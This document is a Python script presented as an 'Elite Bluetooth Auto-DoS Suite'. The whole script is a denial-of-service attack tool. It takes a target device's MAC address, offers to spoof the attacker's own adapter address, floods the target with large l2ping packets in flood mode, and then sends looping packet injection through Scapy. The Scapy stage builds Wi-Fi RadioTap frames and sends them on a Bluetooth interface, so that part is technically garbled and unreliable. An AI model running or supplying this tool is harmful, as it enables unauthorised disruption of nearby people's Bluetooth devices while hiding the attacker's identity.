import subprocess
import time
import os
import sys
from scapy.all import *

# Configuration
INTERFACE = "hci0"

def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode().strip()
    except Exception as e:
        return f"Error: {e}"

def spoof_mac(new_mac):
    print(f"[*] Attempting MAC Spoof to {new_mac}...")
    subprocess.call(f"sudo hciconfig {INTERFACE} down", shell=True)
    # Using a more common approach for some adapters; if it fails, it just continues
    subprocess.call(f"sudo hciconfig {INTERFACE} hwset {new_mac}", shell=True)
    subprocess.call(f"sudo hciconfig {INTERFACE} up", shell=True)
    print("[+] Spoofing sequence executed.")

def lmp_flood(target):
    print(f"[*] Launching L2CAP/LMP Flood on {target}...")
    # -f is flood mode, -s is packet size
    subprocess.Popen(f"sudo l2ping -i {INTERFACE} -s 600 -f {target}", shell=True)

def scapy_injection(target):
    print(f"[*] Injecting raw Bluetooth packets via Scapy...")
    # Use Raw payload to avoid version-specific Layer errors
    # We target the MAC address directly in the raw frame
    try:
        pkt = RadioTap() / Raw(load=f"Target: {target}") 
        send(pkt, iface=INTERFACE, loop=1, inter=0.01, verbose=False)
    except Exception as e:
        print(f"[!] Scapy Injection Error: {e}")

def main():
    os.system("clear")
    print("==== ELITE BLUETOOTH AUTO-DOS SUITE ====")
    
    # Initialize Interface
    run_cmd("sudo rfkill unblock bluetooth")
    run_cmd(f"sudo hciconfig {INTERFACE} up")
    
    target_mac = input("[*] Enter target MAC address: ").strip()
    if not target_mac:
        print("[!] MAC address required.")
        return

    # Step 1: MAC Spoofing
    spoof = input("[?] Do you want to spoof your MAC? (y/n): ").strip().lower()
    if spoof == 'y':
        # Example spoof MAC, normally this would be a calculated address
        fake_mac = "00:11:22:33:44:55" 
        spoof_mac(fake_mac)

    print("\n[*] Starting Automated Attack Chain...")
    
    # Attack 1: L2Ping Flood (The heavy hitter)
    lmp_flood(target_mac)
    
    # Attack 2: Scapy Packet Injection (The disruptor)
    try:
        scapy_injection(target_mac)
    except KeyboardInterrupt:
        print("\n[-] Stopping attack...")
        subprocess.call("sudo pkill l2ping", shell=True)
        print("[*] Cleanup complete.")

if __name__ == "__main__":
    main()
